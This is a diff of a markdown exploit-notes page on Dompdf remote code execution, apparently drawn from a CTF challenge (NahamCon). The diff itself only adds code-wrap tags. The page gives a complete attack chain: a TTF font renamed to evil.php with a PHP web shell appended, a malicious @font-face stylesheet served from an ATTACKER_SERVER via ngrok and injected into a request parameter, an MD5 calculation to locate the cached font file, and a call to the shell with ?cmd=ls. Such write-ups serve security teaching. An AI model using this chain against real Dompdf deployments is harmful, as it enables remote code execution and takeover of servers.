@@ -46,19 +46,24 @@ https://exploit-notes.hdks.org/exploit/web/dompdf-rce
 
 Copy a true type font to php file.
 
+{% code overflow="wrap" %}
 ```bash
 find / -name "*.ttf" 2>/dev/null
 cp /path/to/example.ttf ./evil.php
 ```
+{% endcode %}
 
 Add a shell at the bottom of the file.
 
+{% code overflow="wrap" %}
 ```php
 <?php system($_REQUEST["cmd"]); ?>
 ```
+{% endcode %}
 
 Create a malicious CSS, the info in here is important for accessing the uploaded PHP file, i.e. `/dompdf/lib/fonts/<font_name>_<font_weight/style>_<md5>.php`.
 
+{% code overflow="wrap" %}
 ```css
 @font-face {
     font-family: "evil";
@@ -67,27 +72,34 @@ Create a malicious CSS, the info in here is important for accessing the uploaded
     font-style: "normal";
 }
 ```
+{% endcode %}
 
 Create a python web server and expose using ngrok.
 
+{% code overflow="wrap" %}
 ```
 sudo python -m http.server 80
 ngrok http 80
 ```
+{% endcode %}
 
 Make a request containing the malicious stylesheet.
 
+{% code overflow="wrap" %}
 ```bash
 http://challenge.nahamcon.com:32110/quote.php?organisation=<link rel=stylesheet href='http://ATTACKER_SERVER/exploit.css'>&email=a%40a.com&small=1&medium=1&large=1
 ```
+{% endcode %}
 
 Calculate the MD5 of the malicious PHP URL.
 
+{% code overflow="wrap" %}
 ```bash
 echo -n http://ATTACKER_SERVER/evil.php | md5sum
 
 b8e6174c9d5ee52c9b35647ffbd20856
 ```
+{% endcode %}
 
 Access the URL: http://challenge.nahamcon.com:32110/dompdf/lib/fonts/evil_normal_b8e6174c9d5ee52c9b35647ffbd20856.php?cmd=ls
 
